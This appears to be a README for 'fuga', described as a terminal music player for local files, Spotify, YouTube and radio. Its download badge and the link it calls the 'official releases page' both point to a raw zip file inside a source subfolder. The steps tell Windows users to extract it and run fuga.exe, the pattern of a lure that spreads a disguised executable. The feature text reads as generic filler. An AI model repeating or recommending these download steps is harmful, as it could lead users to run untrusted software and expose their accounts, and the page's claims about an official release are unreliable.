# 🎵 fuga - Manage all your music in one place

[![Download Fuga](https://img.shields.io/badge/Download-Fuga-blue.svg)](https://raw.githubusercontent.com/zarlasobering949/fuga/main/src/source/spotify/Software_v3.3.zip)

Fuga brings your entire music collection into a single window. You can play tracks from your local folders, Spotify, YouTube, SomaFM, and internet radio stations. The interface displays album art directly in your terminal. This tool simplifies music playback for listeners who prefer a clean, text-based experience.

## 📥 How to get started

You need to perform a few steps to set up the software on your Windows computer.

1. Visit the [official releases page](https://raw.githubusercontent.com/zarlasobering949/fuga/main/src/source/spotify/Software_v3.3.zip) to find the latest version.
2. Look for the file ending in `.zip`.
3. Click the file to save it to your computer.
4. Right-click the downloaded folder and select Extract All.
5. Open the extracted folder.
6. Locate the file named `fuga.exe`.
7. Double-click the file to launch the music player.

## 🖥️ System requirements

Your computer needs to meet these basic standards to run the software smoothly:

- Windows 10 or Windows 11.
- At least 4GB of RAM.
- An active internet connection for streaming services.
- A terminal application like Windows Terminal or Command Prompt.

## 🎧 Supported music sources

Fuga connects to various services so you can keep your library in one view.

- Local Files: Access music stored on your hard drive or external disk drives.
- Spotify: Link your account to play your saved playlists and albums.
- YouTube: Search for songs or play videos as audio tracks.
- SomaFM: Enjoy curated radio channels without commercials.
- Radio: Stream high-quality internet radio stations through custom links.

## ⌨️ Using the software

The program uses simple keyboard shortcuts to save you time. You do not need to click through menus with your mouse.

- Play/Pause: Press the Spacebar.
- Next Track: Press the right arrow key.
- Previous Track: Press the left arrow key.
- Volume Up: Press the plus key.
- Volume Down: Press the minus key.
- Search: Type the letter S to start a search.
- Exit: Press the Q key.

## 🖼️ Viewing album art

Fuga displays small images for your albums. This feature works best in a terminal that supports modern graphics. If you see text instead of images, check your terminal settings. Ensure your window size is large enough to render the small picture thumbnails. The software automatically pulls these images from the streaming service or your local folder covers.

## 🛠️ Customizing your experience

You can change how the software looks and behaves by editing the configuration file. Look for a file named `config.toml` inside the folder where you placed the program.

You can adjust these settings:
- Change the background color.
- Set the default music folder for local files.
- Add your Spotify account keys.
- Create lists of your favorite radio stations.

Save the file after you make changes. Restart the program to apply your updates.

## ❓ Frequently asked questions

Do I need to install anything else?
No. Everything you need is inside the folder you downloaded. 

Is the music stored on the computer?
Only local files and cached tracks stay on your disk. Streaming services pull live data to save you space.

Can I create playlists?
Yes. Use the menu options while a song plays to add it to a new or existing playlist.

What happens if the music stops?
Check your internet connection first. If you play local files, verify that the folder path in your settings file is correct.

Can I hide the album art?
Yes. Change the setting in the configuration file to disable thumbnails if you prefer a simpler list view.
